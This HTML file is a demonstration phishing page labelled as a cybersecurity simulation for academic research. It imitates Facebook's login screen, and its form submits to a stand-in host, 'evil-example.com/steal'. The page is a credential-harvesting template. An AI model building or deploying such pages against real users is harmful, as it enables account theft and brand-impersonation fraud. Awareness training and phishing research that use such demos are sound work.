<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Social Media Login</title>

<style>
body 
{
    margin: 0;
    font-family: Arial, Helvetica, sans-serif;
    background: #f0f2f5;
}

.container 
{
    width: 900px;
    margin: 80px auto;
    display: flex;
    align-items: center;
    justify-content: space-between;
}

.left 
{
    width: 480px;
}

.left h1 
{
    color: #1877f2;
    font-size: 56px;
    margin-bottom: 10px;
}

.left p 
{
    font-size: 24px;
    color: #1c1e21;
    line-height: 1.3;
}

.login-card 
{
    width: 360px;
    background: white;
    padding: 22px;
    border-radius: 12px;
    box-shadow: 0 8px 24px rgba(0,0,0,0.15);
}

input 
{
    width: 100%;
    padding: 14px;
    margin-bottom: 14px;
    border: 1px solid #dddfe2;
    border-radius: 8px;
    font-size: 16px;
    box-sizing: border-box;
}

button 
{
    width: 100%;
    padding: 14px;
    background: #1877f2;
    color: white;
    border: none;
    border-radius: 8px;
    font-size: 18px;
    font-weight: bold;
    cursor: pointer;
}

button:hover 
{
    background: #166fe5;
}

.link 
{
    text-align: center;
    margin-top: 15px;
    color: #1877f2;
    font-size: 14px;
}

hr 
{
    border: none;
    border-top: 1px solid #dadde1;
    margin: 22px 0;
}

.create 
{
    background: #42b72a;
}

.notice 
{
    margin-top: 20px;
    font-size: 12px;
    color: #6b7280;
    text-align: center;
}

.simulation-banner
{

    background:#fff3cd;
    color:#856404;
    text-align:center;
    padding:10px;

    font-size:14px;

    border-bottom:1px solid #ffeeba;

}
</style>

</head>

<body>
<div class="simulation-banner">
    🧪 Cybersecurity Simulation Environment | This webpage is created for academic research and demonstration purposes only.
</div>


<div class="container">

    <div class="left">
        <h1>facebook</h1>
        <p>Connect with friends and the world around you.</p>
    </div>

    <div class="login-card">
        <form action="https://evil-example.com/steal">
            <input type="text" placeholder="Email address or phone number">
            <input type="password" placeholder="Password">
            <button type="submit">Log In</button>
        </form>

        <div class="link">Forgotten password?</div>

        <hr>

        <button class="create">Create New Account</button>

        <p class="notice">
            Simulation page for cybersecurity testing only.
        </p>
    </div>

</div>

</body>
</html>
